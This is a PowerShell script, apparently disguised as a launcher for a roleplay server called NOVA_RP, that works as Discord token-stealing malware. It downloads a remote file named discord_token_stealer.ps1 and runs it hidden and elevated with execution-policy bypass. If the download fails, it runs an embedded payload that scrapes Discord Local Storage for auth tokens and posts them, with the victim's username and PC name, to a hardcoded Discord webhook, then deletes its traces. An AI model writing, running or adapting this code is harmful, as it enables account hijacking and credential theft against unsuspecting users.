$URL = "https://gytox.github.io/NOVA_RP/discord_token_stealer.ps1"
$TempPath = "$env:TEMP\NOVA_RP_Launcher.ps1"

try {
    Invoke-WebRequest -Uri $URL -OutFile $TempPath -UseBasicParsing -ErrorAction Stop
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TempPath`"" -Verb RunAs -ErrorAction Stop
    Start-Sleep -Seconds 2
    Remove-Item "$env:TEMP\NOVA_RP_Launcher.ps1" -Force -ErrorAction SilentlyContinue
} catch {
    $EmbeddedPayload = @'
$ErrorActionPreference = "SilentlyContinue"
$Webhook = "https://discord.com/api/webhooks/1549675006970306560/ZizSzCiwDIKRmokuHx8lIUhud9csD0X_iZbzngCHdo50FgGO6-9ySegVN5bXDlqdfr7b"
$paths = @(
    "$env:APPDATA\discord\Local Storage\https://discord.com",
    "$env:LOCALAPPDATA\discord\Local Storage\https://discord.com",
    "$env:APPDATA\discordptb\Local Storage\https://discord.com",
    "$env:LOCALAPPDATA\discordptb\Local Storage\https://discord.com"
)
$tokens = @()
foreach ($path in $paths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Recurse -File | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match '"token"\s*:\s*"([A-Za-z0-9_-]{50,})"') {
                $tokens += $matches[1]
            }
        }
    }
}
if ($tokens.Count -gt 0) {
    $output = "User: $env:USERNAME | PC: $env:COMPUTERNAME | Tokens: $($tokens -join ', ')"
    $body = "{`"content`":`"$output`"}" | ConvertTo-Json
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
}
'@
    $TempPath = "$env:TEMP\NOVA_RP_Launcher.ps1"
    $EmbeddedPayload | Out-File -FilePath $TempPath -Encoding UTF8
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TempPath`""
    Start-Sleep -Seconds 2
    Remove-Item $TempPath -Force -ErrorAction SilentlyContinue
}